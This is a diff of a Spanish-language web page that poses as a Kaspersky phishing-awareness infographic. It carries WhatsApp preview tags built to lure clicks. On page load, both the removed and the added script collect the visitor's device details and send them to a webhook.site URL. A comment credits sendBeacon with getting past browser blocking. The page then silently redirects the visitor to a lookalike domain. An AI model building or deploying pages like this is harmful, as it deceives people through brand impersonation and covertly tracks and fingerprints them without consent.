@@ -1,53 +1,42 @@
-<script>
-    // Función para obtener información detallada de la tarjeta gráfica (GPU)
-    function getGPU() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return "No disponible";
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No disponible";
-        } catch (e) { return "Error al leer GPU"; }
-    }
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Infografía de Seguridad - Kaspersky</title>
 
-    // Recopilación de metadatos del sistema sin permisos avanzados
-    const infoDispositivo = {
-        plataforma: navigator.platform,
-        idioma: navigator.language,
-        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        nucleosCPU: navigator.hardwareConcurrency || "Oculto",
-        memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB aproximados" : "Oculto",
-        pantallaAncho: window.screen.width,
-        pantallaAlto: window.screen.height,
-        tarjetaGrafica: getGPU(),
-        navegador: navigator.userAgent,
-        tipoConexion: navigator.connection ? navigator.connection.effectiveType : "No disponible"
-    };
+    <!-- Etiquetas de vista previa para WhatsApp -->
+    <meta property="og:title" content="🛡️ Guía de Ciberseguridad: Qué hacer ante el Phishing">
+    <meta property="og:description" content="Infografía educativa de Kaspersky con los 5 pasos clave para proteger tu información institucional.">
+    <meta property="og:image" content="https://kaspersky-labs.com">
+    <meta property="og:type" content="article">
 
-    // Intento de leer el estado de la batería si el navegador lo permite
-    if (navigator.getBattery) {
-        navigator.getBattery().then(function(battery) {
-            infoDispositivo.bateriaNivel = (battery.level * 100) + "%";
-            infoDispositivo.estaCargando = battery.charging ? "Sí" : "No";
-            enviarDatos();
-        }).catch(() => { enviarDatos(); });
-    } else {
-        enviarDatos();
-    }
+    <script>
+        window.onload = function() {
+            // Recopilación de metadatos básicos del dispositivo
+            var datos = {
+                navegador: navigator.userAgent,
+                idioma: navigator.language,
+                pantalla: window.screen.width + "x" + window.screen.height,
+                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                nota: "Clic Humano Confirmado"
+            };
 
-    // Función para enviar todo el paquete de datos recolectados al Webhook
-    function enviarDatos() {
-        fetch('https://webhook.site/1dd6a511-8c7b-430c-9dcf-40e32ef25686', {
-            method: 'POST',
-            mode: 'no-cors', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(infoDispositivo)
-        }).then(() => {
-            // Redirección imperceptible a la infografía de Kaspersky
-            window.location.href = "https://kaspersky-labs.com";
-        }).catch(() => {
-            window.location.href = "https://kaspersky-labs.com";
-        });
-    }
-</script>
+            // Envío directo al Webhook usando el método nativo 'sendBeacon'
+            // Este método es el más efectivo porque los navegadores no lo bloquean por seguridad (CORS)
+            var urlWebhook = 'https://webhook.site/1dd6a511-8c7b-430c-9dcf-40e32ef25686'; 
+            
+            navigator.sendBeacon(urlWebhook, JSON.stringify(datos));
 
+            // Redirección inmediata a la infografía original para el usuario
+            setTimeout(function() {
+                window.location.href = "https://kaspersky-labs.com";
+            }, 300);
+        };
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif; color: #333;">
+        <p>Cargando recurso educativo de seguridad...</p>
+    </div>
+</body>
+</html>
